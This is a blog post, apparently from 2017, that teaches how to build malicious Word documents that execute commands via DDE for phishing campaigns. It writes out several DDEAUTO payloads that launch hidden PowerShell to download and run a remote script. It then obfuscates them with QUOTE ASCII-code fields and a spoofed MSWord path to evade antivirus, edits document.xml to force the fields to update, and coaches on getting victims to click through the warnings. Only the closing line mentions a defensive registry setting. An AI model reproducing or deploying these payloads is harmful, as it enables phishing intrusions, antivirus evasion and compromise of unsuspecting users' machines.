---
layout: post
title: Command Execution with DDE in MS Word
published: true
---

This post shows a few different ways to achieve command execution with a malicious Word document by abusing a native Windows technology called Dynamic Data Exchange (DDE).

Macros are not nearly as effective as they once were at establishing a foothold in a target environment. Every major email security solution comes with protection mechanisms that prevent documents with malicious macros from being delivered to their intended recipient. If they make it past email filters, macros can usually be detected by the endpoint security solution on the recipient's machine.

---

# Initial Steps

Create a fresh new Word document or use an existing one that goes along with the pretext of your phishing campaign.

Click on the **Insert** tab in the ribbon. Navigate to **Quick Parts** > **Field...**

![field](/img/dde-word/01-insert-field.png)

Select **= (Formula)** from the list of field names (it should be selected by default) and press OK.

![insert formula](/img/dde-word/02-insert-formula.png)

You will see a new field appear in the document with the message **!Unexpected End of Formula**. Right-click on the field and select **<u>T</u>oggle Field Codes**.

![toggle field](/img/dde-word/03-toggle-field.png)

That will make the field display { `=  \* MERGEFORMAT` }. The DDE payload will be placed inside the curly brackets, replacing `=  \* MERGEFORMAT`. Read the following sections in order to implement an effective DDE payload.

---

## 1. cmd.exe to powershell.exe

This technique executes cmd.exe to launch PowerShell, downloads an object from a remote location, and executes it in memory.

{ `DDEAUTO c:\\windows\\system32\\cmd.exe "/c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring('http://example.com/index')"` }

The prompt from this payload suspiciously references both powershell.exe and cmd.exe.

![basic prompt](/img/dde-word/04-basic-prompt.png)

Of course some users will click Yes, but we can do better.

---

## 2. Straight powershell.exe

PowerShell can be run directly with DDE by providing the full path to its executable (powershell.exe). In this step we will also specify a "topic" after the command string, which results in the prompt looking somewhat more legitimate.

{ `DDEAUTO "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -w 1 -nop IEX (new-object net.webclient).downloadstring('http://example.com/index')" "Security Update"` }

The `"Security Update"` at the end of the field is an arbitrary string and can be changed to whatever aligns best with your phishing pretext. This "topic" replaces the first suspicious reference to powershell.exe, and the user will now be prompted with the following message:

![powershell prompt](/img/dde-word/05-powershell-prompt.png)

What about the second part of that prompt?

---

## 3. Hidden powershell.exe

In order to hide the second reference to PowerShell, we can obscure the true path to our executable by making it look like another program is being started.

{ `DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -w 1 -nop IEX(new-object system.net.webclient).downloadstring('http://example.com/index')" "Security Update"` }

It appears that DDE is going down the usual Microsoft Office path, but the unalterable width of the prompt prevents the user from actually figuring out which program is being executed. In this case, it goes down to the MSWord directory before backing up all the way to the Windows directory and going down again to finally find powershell.exe. 

![hidden powershell prompt](/img/dde-word/06-hidden-01.png)

This payload delivers a prompt that looks the least suspicious to the user so far, but it is still detected by a high number of engines on VirusTotal (28/60).

![03 virus total](/img/dde-word/06-hidden-02.png)

How are 28 antivirus programs catching our payload? They aren't just flagging the use of DDE, right? Correct (for the most part).

---

## 4. Obfuscated powershell.exe (basic)

Let's take the previous payload and obfuscate some of the strings that have a high chance of being flagged by antivirus: `windowspowershell`, `powershell.exe`, and `IEX`. I encourage you to read the entire post before asking why `(new-object system.net.webclient).downloadstring` isn't included. This is just for demo purposes.

![delete these](/img/dde-word/07-obfuscated-01.png)

We're going to use a method called QUOTE to insert characters into fields using their ASCII decimal codes.

For each string of text highlighted above, perform the following steps:

1. Highligh the string
2. Copy it to your clipboard
3. Convert it to ASCII decimal codes. ([Here](http://www.unit-conversion.info/texttools/ascii/) is online tool you can use)

	![ascii characters](/img/dde-word/07-obfuscated-03.png)
4. Delete the string
5. Insert a new field in its place using the method from earlier
6. Type QUOTE in the field and paste in the ASCII code string

It should look like this when it's done:

![ascii payload](/img/dde-word/07-obfuscated-04.png)

{ `DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\`{`QUOTE 087 105 110 100 111 119 115 080 111 119 101 114 083 104 101 108 108`}`\\v1.0\\`{`QUOTE 112 111 119 101 114 115 104 101 108 108 046 101 120 101`}` -w 1 -nop `{`QUOTE 105 101 120`}`(new-object system.net.webclient).downloadstring('http://example.com/index')" "Security Update"`}

Make sure there are no extra spaces *before* the opening curly bracket or *after* the closing curly bracket of each field. Spaces on the *inside* are okay, but spaces on the outside are not; they will break the string and your payload will not work.

| Right: | &nbsp;&nbsp;`...101 108 108 }\\v1.0\\{ QUOTE 112 111...` |
| Wrong: | &nbsp;&nbsp;`...101 108 108} \\v1.0\\ {QUOTE 112 111...` |

<br>
This obfuscation brings the detection rate on VirusTotal down quite a bit (13/60).

![04 virus total](/img/dde-word/07-obfuscated-05.png)

Were you already thinking about how to obfuscate this further? Good!

---

## 5. Obfuscated powershell.exe (complete)

Now we are going to convert the entire payload within the DDE field to ASCII decimal codes in order to use it with the QUOTE technique. Unlike the previous payloads, the backslashes should not be escaped in this one. It will still work if they are, but it will also display two backslashes in the user prompt that shows the fake path to MSWord.

```
C:\Programs\Microsoft\Office\MSWord\..\..\..\..\windows\system32\windowspowershell\v1.0\powershell.exe -w 1 -nop IEX(new-object system.net.webclient).downloadstring('http://example.com/index')
```

In addition to dropping the second backlashes, we won't convert the double-quotes that surround the payload. They will be included in the first DDE field to encapsulate the QUOTE field. Here is the final payload once it is converted:

{ `DDEAUTO "`{`QUOTE 67 58 92 80 114 111 103 114 97 109 115 92 77 105 99 114 111 115 111 102 116 92 79 102 102 105 99 101 92 77 83 87 111 114 100 92 46 46 92 46 46 92 46 46 92 46 46 92 119 105 110 100 111 119 115 92 115 121 115 116 101 109 51 50 92 119 105 110 100 111 119 115 112 111 119 101 114 115 104 101 108 108 92 118 49 46 48 92 112 111 119 101 114 115 104 101 108 108 46 101 120 101 32 45 119 32 49 32 45 110 111 112 32 73 69 88 40 110 101 119 45 111 98 106 101 99 116 32 115 121 115 116 101 109 46 110 101 116 46 119 101 98 99 108 105 101 110 116 41 46 100 111 119 110 108 111 97 100 115 116 114 105 110 103 40 39 104 116 116 112 58 47 47 101 120 97 109 112 108 101 46 99 111 109 47 105 110 100 101 120 39 41`}`" "Security Update"`}

Using this obfuscation technique brings the detection rate down to 4/60.

![05 virus total](/img/dde-word/08-obfuscated-01.png)

In order for antivirus to properly detect this payload method (meaning lower false positives), it would have to search the contents of the document for QUOTE fields and either convert them from ASCII decimal to text or be able to match them to commonly malicious strings.

---

# Getting Clicks

Using DDEAUTO with the last method described won't work. When a user opens the document, not all links will be updated, meaning our nested QUOTE field will not be recognized and our payload will not execute. Here are the two prompts:

![ddeauto prompt 1](/img/dde-word/09-ddeauto-prompt-01.png)

![ddeauto prompt 2](/img/dde-word/09-ddeauto-prompt-02.png)

Notice how the second one has that **!Unexpected End of Formula** message from earlier? Let's fix that. We're going to have to edit a file in the .docx archive to force all of the fields within the document to update automatically.

> Note: There are numerous ways to edit the contents of a .docx archive. If you want to use this method, you'll need 7-Zip and Sublime.

Start by replacing `DDEAUTO` with `DDE`.

![dde field](/img/dde-word/10-dde-field.png)

Save and close the document.

Locate the document in Explorer. Right-click on it and navigate to **7-Zip** > **Open archive**.

![open 7zip](/img/dde-word/11-open-7zip.png)

This will open a 7-Zip window displaying all the files and directories that make up the complete .docx file. Double-click on the **word** directory and locate the file **document.xml**. Right-click on that file and select **View**.

![view document.xml](/img/dde-word/12-view-documentxml.png)

By default, this will open **document.xml** in Notepad. Your system may be different. 

![notepad document.xml](/img/dde-word/12-view-documentxml-02.png)

We can edit the file in Notepad or copy its contents to a text editor of our choice (Sublime). Use *Find* to locate all instances of the word **begin** and ensure that they are all part of the elements that match the string `<w:fldChar w:fldCharType="begin"/>`. 

![edit document.xml](/img/dde-word/13-edit-documentxml-01.png)

Use *Find All* to select each instance of the word and then add `w:dirty="true"` to the end of each string. They should now be updated to: `<w:fldChar w:fldCharType="begin" w:dirty="true"/>`.

Copy everything from Sublime back to Notepad and save the document in Notepad. Once it is closed, 7-Zip will ask if we want to update the file. Click OK.

![save document.xml](/img/dde-word/13-edit-documentxml-02.png)

Close 7-Zip. The document is now ready to be delivered. I recommend compressing it into a ZIP folder at this point so that if you accidentally update/alter any field codes while testing the final payload you can just delete that copy and unzip a new one.


## What the User Sees

When a user downloads and opens this document (from an email or from a link you sent them), they will have to click 3 times before the DDE command is executed.

If they end up making the initial **Enable Editing** click to exit Protected View, chances are they will disregard any subsequent prompts that are thrown at them. Users typically want to get rid of any uncomfortable warnings or error messages in order to see the data they are meant to see in all its unobstructed glory.

![first click](/img/dde-word/14-click-01.png)

After leaving Protected View, they're asked if they want to update the fields in this document. Why wouldn't they?

![second click](/img/dde-word/14-click-02.png)

An obsure message, but the user can clearly see that they need to click **Yes** in order to start MSWord.

![third click](/img/dde-word/14-click-03.png)

At this point, if everything goes according to plan and our staged payload isn't blocked upstream, we're on their machine. The following prompt doesn't do anything; they can click **OK** or exit out, but the payload already executed.

![useless prompt](/img/dde-word/15-useless-prompt.png)

## Conclusion

Using DDE is a reliable way to achieve command-execution at the end of 2017. Not described in this post are methods for obfuscating payloads further and bypassing Microsoft security features like Protected View by chaining payloads from different documents together. Antivirus has not really caught up to this attack vector yet and probably won't anytime soon. The best defense is to disable DDE links from auto-updating in the registry. A resource to help with that can be found [here](https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b).



